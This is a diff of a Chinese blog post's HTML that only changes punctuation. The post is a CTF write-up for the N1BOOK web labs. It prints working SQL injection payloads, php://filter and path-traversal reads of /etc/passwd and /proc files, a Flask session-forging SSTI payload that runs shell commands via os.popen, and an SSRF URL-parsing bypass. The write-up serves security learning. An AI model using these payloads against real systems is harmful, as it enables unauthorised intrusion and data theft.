@@ -7,18 +7,18 @@
 <meta name=keywords content="CTF">
 <meta name=description content="平台地址:N1BOOK平台-Nu1L Team
 第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。
- 环境搭建 docker-compose.yml:
-version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动:
+ 环境搭建 docker-compose.yml：
+version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动：
 docker-compose up -d解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:
 User-agent: *Disallow:/flag1_is_her3_fun.txt访问flag1_is_her3_fun.txt，获得第一部分flag。
 剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。
 粗心的小李  Des:看看能不能找到信息吧?
- 环境搭建 docker-compose.yml:
-version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动:
+ 环境搭建 docker-compose.yml：
+version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动：
 docker-compose up -d解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)
 使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。
 SQL注入 SQL注入-1  Des:N/A。
- 环境搭建 docker-compose.yml:
+ 环境搭建 docker-compose.yml：
 version: '3.2' services: web: image: registry.">
 <meta name=author content="DaChui">
 <link rel=canonical href=https://oopsdc.tk/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/>
@@ -34,18 +34,18 @@ version: '3.2' services: web: image: registry.">
 <meta property="og:title" content="从0到1-CTFer成长之路">
 <meta property="og:description" content="平台地址:N1BOOK平台-Nu1L Team
 第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。
- 环境搭建 docker-compose.yml:
-version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动:
+ 环境搭建 docker-compose.yml：
+version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动：
 docker-compose up -d解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:
 User-agent: *Disallow:/flag1_is_her3_fun.txt访问flag1_is_her3_fun.txt，获得第一部分flag。
 剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。
 粗心的小李  Des:看看能不能找到信息吧?
- 环境搭建 docker-compose.yml:
-version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动:
+ 环境搭建 docker-compose.yml：
+version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动：
 docker-compose up -d解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)
 使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。
 SQL注入 SQL注入-1  Des:N/A。
- 环境搭建 docker-compose.yml:
+ 环境搭建 docker-compose.yml：
 version: '3.2' services: web: image: registry.">
 <meta property="og:type" content="article">
 <meta property="og:url" content="https://oopsdc.tk/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/"><meta property="og:image" content="https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="post">
@@ -56,21 +56,21 @@ version: '3.2' services: web: image: registry.">
 <meta name=twitter:title content="从0到1-CTFer成长之路">
 <meta name=twitter:description content="平台地址:N1BOOK平台-Nu1L Team
 第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。
- 环境搭建 docker-compose.yml:
-version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动:
+ 环境搭建 docker-compose.yml：
+version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动：
 docker-compose up -d解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:
 User-agent: *Disallow:/flag1_is_her3_fun.txt访问flag1_is_her3_fun.txt，获得第一部分flag。
 剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。
 粗心的小李  Des:看看能不能找到信息吧?
- 环境搭建 docker-compose.yml:
-version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动:
+ 环境搭建 docker-compose.yml：
+version: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动：
 docker-compose up -d解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)
 使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。
 SQL注入 SQL注入-1  Des:N/A。
- 环境搭建 docker-compose.yml:
+ 环境搭建 docker-compose.yml：
 version: '3.2' services: web: image: registry.">
 <script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://oopsdc.tk/post/"},{"@type":"ListItem","position":2,"name":"从0到1-CTFer成长之路","item":"https://oopsdc.tk/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/"}]}</script>
-<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"从0到1-CTFer成长之路","name":"从0到1-CTFer成长之路","description":"平台地址:N1BOOK平台-Nu1L Team\n第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。\n 环境搭建 docker-compose.yml:\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动:\ndocker-compose up -d\r解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:\nUser-agent: *\rDisallow:\r/flag1_is_her3_fun.txt\r访问flag1_is_her3_fun.txt，获得第一部分flag。\n剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。\n粗心的小李  Des:看看能不能找到信息吧?\n 环境搭建 docker-compose.yml:\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动:\ndocker-compose up -d\r解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)\n使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。\nSQL注入 SQL注入-1  Des:N/A。\n 环境搭建 docker-compose.yml:\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.","keywords":["CTF"],"articleBody":"平台地址:N1BOOK平台-Nu1L Team\n第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。\n 环境搭建 docker-compose.yml:\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动:\ndocker-compose up -d\r解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:\nUser-agent: *\rDisallow:\r/flag1_is_her3_fun.txt\r访问flag1_is_her3_fun.txt，获得第一部分flag。\n剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。\n粗心的小李  Des:看看能不能找到信息吧?\n 环境搭建 docker-compose.yml:\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动:\ndocker-compose up -d\r解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)\n使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。\nSQL注入 SQL注入-1  Des:N/A。\n 环境搭建 docker-compose.yml:\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-1:latest ports: - 80:80 启动:\ndocker-compose up -d\r解题过程 访问后发现URL如下:\nhttp://:/index.php?id=1\r猜测id是注入点。\n判断是否为数字型注入:\nhttp://:/index.php?id=1-1\r页面无变化，继续判断是否为字符型注入:\nhttp://:/index.php?id=1'\r页面错误，用联合查询看一下有几列数据:\nhttp://:/index.php?id=-1%27union%20select%201,2,3%23\r查库名:\nhttp://:/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23\r查表名:\nhttp://:/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23\r查字段:\nhttp://:/index.php?id=-1%27union%20select%201,fllllag,1%20from%20fl4g%23\rSQL注入-2  Des:请访问 http://127.0.0.1/login.php http://127.0.0.1/user.php\n 环境搭建 docker-compose.yml:\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-2:latest ports: - 80:80 启动:\ndocker-compose up -d\r解题过程 是一个后台登录页面，尝试账密admin/admin，显示账号或密码错误，尝试admin'/admin，显示账号不存在。猜测存在SQL注入，用延时函数判断一下注入类型:\nadmin' and sleep(5)#\r页面回显延时5秒，存在字符型注入。继续尝试万能密码，无法登录，正确思路应该不是登录，而是通过注入获得flag。\n使用bp抓包进行updatexml报错注入。\nURL:\nhttp://:/login.php?tips=1\r爆数据库名:\nname=admin' and updatexml(1,concat(0x7e,(seleselectct group_concat(table_name)from information_schema.tables where table_schema=database())),1)%23\u0026pass=admin\r得到两个库名:\nfl4g\rusers\r爆表名:\nname=admin' and updatexml(1,concat(0x7e,(seleselectct group_concat(column_name)from information_schema.columns where table_name='fl4g')),1)%23\u0026pass=admin\r得到一个表名:\nflag\r爆字段:\nname=admin' and updatexml(1,concat(0x7e,(seleselectct (flag)from fl4g)),1)%23\u0026pass=admin\r任意文件读取漏洞 afr_1  Des:N/A。\n 环境搭建 docker-compose.yml:\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-1:latest ports: - 80:80 启动:\ndocker-compose up -d\r解题过程 访问页面，会自动添加一个?p=hello参数，尝试修改参数值，更改了几个值页面都是空白，猜测是读写文件。那么就看一看flag文件是否存在，存在，但是页面回显为no no no。\n猜测使用了php协议的filter机制，尝试一下:\nhttp://:/?p=php://filter/convert.base64-encode/resource=hello\r得到一个Base64编码的字符串，解码如下:\nphp echo \"hello world!\"; 同理查看flag文件，获得flag。\nafr_2  Des:N/A。\n 环境搭建 docker-compose.yml:\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-2:latest ports: - 80:80 启动:\ndocker-compose up -d\r解题过程 页面源码如下:\nhtml head titleu1s1title head body HELLO! img src=\"img/img.gif\" body html 看看能否访问img目录，成功。看了一下网站服务，发现使用了nginx，那就有可能出现配置不当导致的目录穿越漏洞。\n尝试访问如下地址:\nhttp://:/img../\r获得flag。\nafr_3  Des:N/A。\n 环境搭建 docker-compose.yml:\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-3:latest ports: - 5000:5000 启动:\ndocker-compose up -d\r解题过程 网页是一个输入框，且能够进行XSS注入。\n点击提交按钮后继续点击超链接，跳转到一个实例文章页面，URL如下:\nhttp://:/article?name=article\r尝试修改name的值，本来想看看是否存在flag文件，结果打错为fkag，意外爆出了路径:\n继续尝试访问flag文件，显示没有权限。\n再看看能不能读取到其它文件:\nhttp://:/article?name=../../../etc/passwd\r还可以用以下姿势来得到更多的信息:\n/proc/sched_debug\t# 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用\r/proc/mounts\t# 挂载的文件系统列表\r/proc/net/arp\t# arp表，可以获得内网其他机器的地址\r/proc/net/route\t# 路由表信息\r/proc/net/tcp and /proc/net/udp # 活动连接的信息\r/proc/net/fib_trie\t# 路由缓存\r/proc/version\t# 内核版本\r/proc/[PID]/cmdline # 可能包含有用的路径信息\r/proc/[PID]/environ # 程序运行的环境变量信息，可以用来包含getshell\r/proc/[PID]/cwd\t# 当前进程的工作目录\r/proc/[PID]/fd/[#]\t# 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log\r读一下cmdline:\nhttp://:/article?name=../../../proc/self/cmdline\r回显为pythonserver.py，猜测题目为python环境，那么先使用cwd找一下server.py文件:\nhttp://:/article?name=../../../proc/self/cwd/server.py\r回显如下:\n#!/usr/bin/python import os from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string ) from flask_session import Session app = Flask(__name__) execfile('flag.py') execfile('key.py') FLAG = flag app.secret_key = key @app.route(\"/n1page\", methods=[\"GET\", \"POST\"]) def n1page(): if request.method != \"POST\": return redirect(url_for(\"index\")) n1code = request.form.get(\"n1code\") or None if n1code is not None: n1code = n1code.replace(\".\", \"\").replace(\"_\", \"\").replace(\"{\",\"\").replace(\"}\",\"\") if \"n1code\" not in session or session['n1code'] is None: session['n1code'] = n1code template = None if session['n1code'] is not None: template = '''N1 Page Hello : %s, why you don't look at our article?   ''' % session['n1code'] session['n1code'] = None return render_template_string(template) @app.route(\"/\", methods=[\"GET\"]) def index(): return render_template(\"main.html\") @app.route('/article', methods=['GET']) def article(): error = 0 if 'name' in request.args: page = request.args.get('name') else: page = 'article' if page.find('flag')=0: page = 'notallowed.txt' try: template = open('/home/nu11111111l/articles/{}'.format(page)).read() except Exception as e: template = e return render_template('article.html', template=template) if __name__ == \"__main__\": app.run(host='0.0.0.0', debug=False) 盲猜flag在flag.py里，但还是无权限访问，看看key.py，内容如下:\n#!/usr/bin/python key = 'Drmhze6EPcv0fN_81Bj-nA' 通过插件发现网站使用flask框架，应该有SSTI模板注入，注意到server.py里的过滤语句:\nif n1code is not None: n1code = n1code.replace(\".\", \"\").replace(\"_\", \"\").replace(\"{\",\"\").replace(\"}\",\"\") 还有下面的这两句:\nif \"n1code\" not in session or session['n1code'] is None: session['n1code'] = n1code template = None template = '''N1 Page Hello : %s, why you don't look at our article?   ''' % session['n1code'] 模板渲染的内容就是n1code，但n1code的来源可以为session，我们就可以利用flask的session伪造查看flag。\n伪造session需要一个密钥，密钥就是key.py中的那一个字符串。\nflask session加密脚本:noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)\n构造语句:\n{'n1code': '{{\\'\\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\\'os\\'].popen(\\'cat flag.py\\').read()}}'} 工具使用:\npython ./flask_session_cookie_manager3.py encode -s \"Drmhze6EPcv0fN_81Bj-nA\" -t \"{'n1code': '{{\\'\\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\\'os\\'].popen(\\'cat flag.py\\').read()}}'}\" .eJwdikEKgCAQAL8SX1YvQ12CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAP1jNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWad0PkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.X6pHGQ.HTAUFHnMrWWCCfiRJXBNyUdj4IY 发包:\n第二章 Web进阶 SSRF漏洞 SSRF Training  Des:\nweb容器中存在一个flag，mysql中存在一个管理员账号密码，其余容器中均没有特定flag\nmysql容器中内置 tcpdump\nvulnweb容器中内置一个 fpm.py 攻击脚本\n 环境搭建 docker-compose.yml:\nversion: \"3\" services: web: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-1:latest depends_on: - redis - vuln - mysql ports: - \"80:80\" redis: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-2:latest vuln: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-3:latest mysql: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-4:latest environment: - MYSQL_RANDOM_ROOT_PASSWORD=yes 启动:\ndocker-compose up -d\r解题过程 想直接访问flag.php，直接就出来了:\nhttp://127.0.0.1/flag.php\r正确思路应该是利用URL解析差异，如:\nhttp://x@127.0.0.1:80@google.com/flag.php\r进入safe_request_curl后，curl获取到的是127.0.0.1:80/flag.php，parse_url获取到的host是google.com，利用解析差异实现SSRF攻击。\n 本文链接:从0到1-CTFer成长之路 | Atmet (oopsdc.tk)\n文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","wordCount":"573","inLanguage":"en","datePublished":"2021-07-03T18:59:29+08:00","dateModified":"2021-07-03T18:59:29+08:00","author":{"@type":"Person","name":"DaChui"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://oopsdc.tk/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/"},"publisher":{"@type":"Organization","name":"Atmet","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"从0到1-CTFer成长之路","name":"从0到1-CTFer成长之路","description":"平台地址:N1BOOK平台-Nu1L Team\n第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:\nUser-agent: *\rDisallow:\r/flag1_is_her3_fun.txt\r访问flag1_is_her3_fun.txt，获得第一部分flag。\n剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。\n粗心的小李  Des:看看能不能找到信息吧?\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)\n使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。\nSQL注入 SQL注入-1  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: \u0026#39;3.2\u0026#39; services: web: image: registry.","keywords":["CTF"],"articleBody":"平台地址:N1BOOK平台-Nu1L Team\n第一章 Web入门 信息搜集 常见搜集  Des:一共3部分flag。\n 环境搭建 docker-compose.yml：\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 既然说到了敏感文件，先试试robots.txt文件是否存在:\nUser-agent: *\rDisallow:\r/flag1_is_her3_fun.txt\r访问flag1_is_her3_fun.txt，获得第一部分flag。\n剩下的工作就是扫描后台了，分别访问index.php~和.index.php.swp。\n粗心的小李  Des:看看能不能找到信息吧?\n 环境搭建 docker-compose.yml：\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-information-git:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 Git泄露，找一下利用工具:gakki429/Git_Extract: 提取远程 git 泄露或本地 git 的工具 (github.com)\n使用后会在当前目录生成一个以网站命名的文件夹，cd进去，发现有一个index.html文件。flag就在其中。\nSQL注入 SQL注入-1  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-1:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 访问后发现URL如下：\nhttp://:/index.php?id=1\r猜测id是注入点。\n判断是否为数字型注入：\nhttp://:/index.php?id=1-1\r页面无变化，继续判断是否为字符型注入：\nhttp://:/index.php?id=1'\r页面错误，用联合查询看一下有几列数据：\nhttp://:/index.php?id=-1%27union%20select%201,2,3%23\r查库名：\nhttp://:/index.php?id=-1%27union%20select%201,group_concat(table_name),1%20from%20information_schema.tables%20where%20table_schema=database()%23\r查表名：\nhttp://:/index.php?id=-1%27union%20select%201,group_concat(column_name),1%20from%20information_schema.columns%20where%20table_name=%27fl4g%27%23\r查字段：\nhttp://:/index.php?id=-1%27union%20select%201,fllllag,1%20from%20fl4g%23\rSQL注入-2  Des:请访问 http://127.0.0.1/login.php http://127.0.0.1/user.php\n 环境搭建 docker-compose.yml：\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-sql-2:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 是一个后台登录页面，尝试账密admin/admin，显示账号或密码错误，尝试admin'/admin，显示账号不存在。猜测存在SQL注入，用延时函数判断一下注入类型：\nadmin' and sleep(5)#\r页面回显延时5秒，存在字符型注入。继续尝试万能密码，无法登录，正确思路应该不是登录，而是通过注入获得flag。\n使用bp抓包进行updatexml报错注入。\nURL：\nhttp://:/login.php?tips=1\r爆数据库名：\nname=admin' and updatexml(1,concat(0x7e,(seleselectct group_concat(table_name)from information_schema.tables where table_schema=database())),1)%23\u0026pass=admin\r得到两个库名：\nfl4g\rusers\r爆表名：\nname=admin' and updatexml(1,concat(0x7e,(seleselectct group_concat(column_name)from information_schema.columns where table_name='fl4g')),1)%23\u0026pass=admin\r得到一个表名：\nflag\r爆字段：\nname=admin' and updatexml(1,concat(0x7e,(seleselectct (flag)from fl4g)),1)%23\u0026pass=admin\r任意文件读取漏洞 afr_1  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-1:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 访问页面，会自动添加一个?p=hello参数，尝试修改参数值，更改了几个值页面都是空白，猜测是读写文件。那么就看一看flag文件是否存在，存在，但是页面回显为no no no。\n猜测使用了php协议的filter机制，尝试一下：\nhttp://:/?p=php://filter/convert.base64-encode/resource=hello\r得到一个Base64编码的字符串，解码如下：\nphp echo \"hello world!\"; 同理查看flag文件，获得flag。\nafr_2  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-2:latest ports: - 80:80 启动：\ndocker-compose up -d\r解题过程 页面源码如下：\nhtml head titleu1s1title head body HELLO! img src=\"img/img.gif\" body html 看看能否访问img目录，成功。看了一下网站服务，发现使用了nginx，那就有可能出现配置不当导致的目录穿越漏洞。\n尝试访问如下地址：\nhttp://:/img../\r获得flag。\nafr_3  Des:N/A。\n 环境搭建 docker-compose.yml：\nversion: '3.2' services: web: image: registry.cn-hangzhou.aliyuncs.com/n1book/web-file-read-3:latest ports: - 5000:5000 启动：\ndocker-compose up -d\r解题过程 网页是一个输入框，且能够进行XSS注入。\n点击提交按钮后继续点击超链接，跳转到一个实例文章页面，URL如下：\nhttp://:/article?name=article\r尝试修改name的值，本来想看看是否存在flag文件，结果打错为fkag，意外爆出了路径：\n继续尝试访问flag文件，显示没有权限。\n再看看能不能读取到其它文件：\nhttp://:/article?name=../../../etc/passwd\r还可以用以下姿势来得到更多的信息：\n/proc/sched_debug\t# 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用\r/proc/mounts\t# 挂载的文件系统列表\r/proc/net/arp\t# arp表，可以获得内网其他机器的地址\r/proc/net/route\t# 路由表信息\r/proc/net/tcp and /proc/net/udp # 活动连接的信息\r/proc/net/fib_trie\t# 路由缓存\r/proc/version\t# 内核版本\r/proc/[PID]/cmdline # 可能包含有用的路径信息\r/proc/[PID]/environ # 程序运行的环境变量信息，可以用来包含getshell\r/proc/[PID]/cwd\t# 当前进程的工作目录\r/proc/[PID]/fd/[#]\t# 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log\r读一下cmdline：\nhttp://:/article?name=../../../proc/self/cmdline\r回显为pythonserver.py，猜测题目为python环境，那么先使用cwd找一下server.py文件：\nhttp://:/article?name=../../../proc/self/cwd/server.py\r回显如下：\n#!/usr/bin/python import os from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string ) from flask_session import Session app = Flask(__name__) execfile('flag.py') execfile('key.py') FLAG = flag app.secret_key = key @app.route(\"/n1page\", methods=[\"GET\", \"POST\"]) def n1page(): if request.method != \"POST\": return redirect(url_for(\"index\")) n1code = request.form.get(\"n1code\") or None if n1code is not None: n1code = n1code.replace(\".\", \"\").replace(\"_\", \"\").replace(\"{\",\"\").replace(\"}\",\"\") if \"n1code\" not in session or session['n1code'] is None: session['n1code'] = n1code template = None if session['n1code'] is not None: template = '''N1 Page Hello : %s, why you don't look at our article?   ''' % session['n1code'] session['n1code'] = None return render_template_string(template) @app.route(\"/\", methods=[\"GET\"]) def index(): return render_template(\"main.html\") @app.route('/article', methods=['GET']) def article(): error = 0 if 'name' in request.args: page = request.args.get('name') else: page = 'article' if page.find('flag')=0: page = 'notallowed.txt' try: template = open('/home/nu11111111l/articles/{}'.format(page)).read() except Exception as e: template = e return render_template('article.html', template=template) if __name__ == \"__main__\": app.run(host='0.0.0.0', debug=False) 盲猜flag在flag.py里，但还是无权限访问，看看key.py，内容如下：\n#!/usr/bin/python key = 'Drmhze6EPcv0fN_81Bj-nA' 通过插件发现网站使用flask框架，应该有SSTI模板注入，注意到server.py里的过滤语句：\nif n1code is not None: n1code = n1code.replace(\".\", \"\").replace(\"_\", \"\").replace(\"{\",\"\").replace(\"}\",\"\") 还有下面的这两句：\nif \"n1code\" not in session or session['n1code'] is None: session['n1code'] = n1code template = None template = '''N1 Page Hello : %s, why you don't look at our article?   ''' % session['n1code'] 模板渲染的内容就是n1code，但n1code的来源可以为session，我们就可以利用flask的session伪造查看flag。\n伪造session需要一个密钥，密钥就是key.py中的那一个字符串。\nflask session加密脚本:noraj/flask-session-cookie-manager: Flask Session Cookie Decoder/Encoder (github.com)\n构造语句：\n{'n1code': '{{\\'\\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\\'os\\'].popen(\\'cat flag.py\\').read()}}'} 工具使用：\npython ./flask_session_cookie_manager3.py encode -s \"Drmhze6EPcv0fN_81Bj-nA\" -t \"{'n1code': '{{\\'\\'.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\\'os\\'].popen(\\'cat flag.py\\').read()}}'}\" .eJwdikEKgCAQAL8SX1YvQ12CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAP1jNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWad0PkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.X6pHGQ.HTAUFHnMrWWCCfiRJXBNyUdj4IY 发包：\n第二章 Web进阶 SSRF漏洞 SSRF Training  Des:\nweb容器中存在一个flag，mysql中存在一个管理员账号密码，其余容器中均没有特定flag\nmysql容器中内置 tcpdump\nvulnweb容器中内置一个 fpm.py 攻击脚本\n 环境搭建 docker-compose.yml：\nversion: \"3\" services: web: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-1:latest depends_on: - redis - vuln - mysql ports: - \"80:80\" redis: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-2:latest vuln: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-3:latest mysql: image: registry.cn-beijing.aliyuncs.com/n1book/web-ssrf-4:latest environment: - MYSQL_RANDOM_ROOT_PASSWORD=yes 启动：\ndocker-compose up -d\r解题过程 想直接访问flag.php，直接就出来了：\nhttp://127.0.0.1/flag.php\r正确思路应该是利用URL解析差异，如：\nhttp://x@127.0.0.1:80@google.com/flag.php\r进入safe_request_curl后，curl获取到的是127.0.0.1:80/flag.php，parse_url获取到的host是google.com，利用解析差异实现SSRF攻击。\n 本文链接:从0到1-CTFer成长之路 | Atmet (oopsdc.tk)\n文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。\n ","wordCount":"573","inLanguage":"en","datePublished":"2021-07-03T18:59:29+08:00","dateModified":"2021-07-03T18:59:29+08:00","author":{"@type":"Person","name":"DaChui"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://oopsdc.tk/post/%E4%BB%8E0%E5%88%B01-ctfer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/"},"publisher":{"@type":"Organization","name":"Atmet","logo":{"@type":"ImageObject","url":"https://gitee.com/oopsdc/PicBed/raw/master/oopsdc.tk/favicon.png"}}}</script>
 </head>
 <body id=top>
 <script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
@@ -197,7 +197,7 @@ July 3, 2021&nbsp;·&nbsp;3 min&nbsp;·&nbsp;DaChui
 <p>Des:一共3部分flag。</p>
 </blockquote>
 <h4 id=环境搭建>环境搭建<a hidden class=anchor aria-hidden=true href=#环境搭建>#</a></h4>
-<p><code>docker-compose.yml</code>:</p>
+<p><code>docker-compose.yml</code>：</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yaml data-lang=yaml><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3.2&#39;</span>
 
 <span style=color:#f92672>services</span>:
@@ -205,7 +205,7 @@ July 3, 2021&nbsp;·&nbsp;3 min&nbsp;·&nbsp;DaChui
     <span style=color:#f92672>image</span>: <span style=color:#ae81ff>registry.cn-hangzhou.aliyuncs.com/n1book/web-information-backk:latest</span>
     <span style=color:#f92672>ports</span>:
       - <span style=color:#ae81ff>80</span>:<span style=color:#ae81ff>80</span>
-</code></pre></div><p>启动:</p>
+</code></pre></div><p>启动：</p>
 <pre><code>docker-compose up -d
 </code></pre><h4 id=解题过程>解题过程<a hidden class=anchor aria-hidden=true href=#解题过程>#</a></h4>
